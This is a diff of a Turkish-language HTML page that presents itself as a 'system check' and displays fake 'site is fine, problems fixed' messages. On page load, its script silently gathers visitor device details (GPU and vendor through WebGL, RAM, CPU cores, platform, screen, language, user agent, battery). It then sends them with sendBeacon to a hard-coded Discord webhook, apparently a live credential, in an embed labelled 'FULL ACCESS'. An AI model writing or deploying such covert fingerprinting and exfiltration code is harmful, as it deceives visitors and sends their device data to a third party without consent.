@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem</title>
+    <title>Sistem Kontrolü</title>
     <style>
-        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; }
-        h2 { color:#111; font-size:10px; }
-        .ok { color:#0f4; font-weight:bold; font-size:14px; }
+        body { background:#050505; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; }
+        h2 { color:#444; font-size:13px; font-weight:400; letter-spacing:1px; }
+        .ok { color:#0f4; font-weight:bold; }
     </style>
 </head>
 <body>
@@ -16,48 +16,60 @@
     <script>
         const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        async function start() {
-            let info = { bat: "N/A", gpu: "N/A", v: "N/A" };
-
-            // 1. ZORLU VERİ ÇEKİMİ (PİL VE GPU)
+        async function extract() {
+            let info = {};
+            
+            // 1. DERİN GPU ANALİZİ
             try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
+                info.vendor = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
+            } catch(e) { info.gpu = "Engellendi"; }
+
+            // 2. DONANIM VE SİSTEM
+            info.ram = navigator.deviceMemory + " GB";
+            info.cpu = navigator.hardwareConcurrency + " Çekirdek";
+            info.plt = navigator.platform;
+            info.res = screen.width + "x" + screen.height + " (" + window.devicePixelRatio + "x)";
+            info.lang = navigator.language;
+            info.ua = navigator.userAgent;
+
+            // 3. PİL VE BAĞLANTI (GİZLİ)
+            if (navigator.getBattery) {
                 const b = await navigator.getBattery();
-                info.bat = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Şarjda' : 'Pilde'})`;
-            } catch(e) {}
+                info.bat = (b.level * 100) + "% (Şarjda: " + (b.charging ? 'Evet' : 'Hayır') + ")";
+            }
 
-            try {
-                const c = document.createElement('canvas');
-                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-                const d = gl.getExtension('WEBGL_debug_renderer_info');
-                info.gpu = gl.getParameter(d.UNMASKED_RENDERER_ID);
-                info.v = gl.getParameter(d.UNMASKED_VENDOR_ID);
-            } catch(e) {}
-
-            // 2. TAM RAPOR OLUŞTURMA (İSTEDİĞİN ŞABLON)
+            // 4. VERİ PAKETLEME (EN VAHŞİ SET)
             const payload = {
                 embeds: [{
                     title: "🕵️ KRİTİK CİHAZ ANALİZİ (FULL ACCESS)",
                     color: 15158332,
                     fields: [
-                        { name: "🛠️ DONANIM KATMANI", value: `**GPU:** ${info.gpu}\n**VENDOR:** ${info.v}\n**RAM:** ${navigator.deviceMemory || 'X'} GB\n**CPU:** ${navigator.hardwareConcurrency || 'X'} Çekirdek`, inline: false },
-                        { name: "📱 YAZILIM/EKRAN", value: `**OS:** ${navigator.platform}\n**RES:** ${screen.width}x${screen.height} (${window.devicePixelRatio}x)\n**DİL:** ${navigator.language}`, inline: true },
-                        { name: "🔋 DURUM", value: info.bat, inline: true },
-                        { name: "🌐 TARAYICI KİMLİĞİ", value: "```" + navigator.userAgent + "```", inline: false }
+                        { name: "🛠️ DONANIM KATMANI", value: `**GPU:** ${info.gpu}\n**VENDOR:** ${info.vendor}\n**RAM:** ${info.ram}\n**CPU:** ${info.cpu}`, inline: false },
+                        { name: "📱 YAZILIM/EKRAN", value: `**OS:** ${info.plt}\n**RES:** ${info.res}\n**DİL:** ${info.lang}`, inline: true },
+                        { name: "🔋 DURUM", value: info.bat || "Erişim Yok", inline: true },
+                        { name: "🌐 TARAYICI KİMLİĞİ", value: "```" + info.ua + "```", inline: false }
                     ],
                     timestamp: new Date()
                 }]
             };
 
-            // 3. ENGELLENEMEZ GÖNDERİM (XHR - En İlkel ve En Güçlü)
-            const xhr = new XMLHttpRequest();
-            xhr.open("POST", u, true);
-            xhr.setRequestHeader('Content-type', 'application/json');
-            xhr.send(JSON.stringify(payload));
+            // 5. YILDIRIM GÖNDERİM
+            const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
+            navigator.sendBeacon(u, blob);
 
-            // Yedek olarak Beacon
-            navigator.sendBeacon(u, JSON.stringify(payload));
-
-            // 4. HIZLI ARAYÜZ
+            // 6. ARAYÜZ AKIŞI
             const t = document.getElementById('t');
-            t.innerHTML = '<span class="ok">Site uygun
-                    
+            setTimeout(() => { t.innerHTML = '<span class="ok">Site uygun halde!</span>'; }, 200);
+            setTimeout(() => { t.innerHTML = '<span class="ok">Sorunlar düzeltildi.</span>'; }, 700);
+        }
+
+        extract();
+    </script>
+</body>
+</html>
+
+
